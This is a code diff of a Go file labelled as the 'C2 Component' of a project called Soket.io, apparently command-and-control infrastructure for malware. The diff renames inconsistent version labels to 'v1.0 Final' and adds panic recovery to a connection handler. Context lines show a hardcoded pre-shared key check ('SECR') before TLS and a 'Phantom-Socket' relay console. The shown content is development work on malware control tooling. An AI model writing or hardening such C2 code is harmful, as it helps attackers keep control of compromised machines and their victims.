@@ -1,6 +1,6 @@
-// Project: Soket.io V7.0
+// Project: Soket.io v1.0 Final
 // Module: C2 Component
-// Description:  C2 Infrastructure component.
+// Description: v1.0 Final C2 Infrastructure component.
 
 package main
 
@@ -226,10 +226,17 @@ func acceptConnections(listener net.Listener, registry *peer.Registry, cfg *conf
 }
 
 func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Printf("Recovered from panic in handleConnection: %v", r)
+			conn.Close()
+		}
+	}()
+
 	remoteAddr := conn.RemoteAddr().String()
 	logger.Printf("New connection from %s", remoteAddr)
 
-	// PSK Pre-Auth (V2.0 Supreme Protection)
+	// PSK Pre-Auth (v1.0 Final Supreme Protection)
 	// Before TLS Handshake, expect 4-byte PSK
 	pskBuf := make([]byte, 4)
 	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
@@ -238,7 +245,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		conn.Close()
 		return
 	}
-	// Expected PSK for V2.0 (First 4 bytes of 'SECRET123' -> 'SECR')
+	// Expected PSK for v1.0 Final (First 4 bytes of 'SECRET123' -> 'SECR')
 	if string(pskBuf) != "SECR" {
 		logger.Printf("Pre-Auth failed (invalid PSK) from %s", remoteAddr)
 		conn.Close()
@@ -342,7 +349,7 @@ func printPeerList(registry *peer.Registry) {
 
 func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
 	consoleMode = true
-	fmt.Println("Phantom-Socket V3.0 Relay Multiplexer Console")
+	fmt.Println("Phantom-Socket v1.0 Relay Multiplexer Console")
 	fmt.Println("Type 'help' for available commands.")
 	fmt.Println()
 
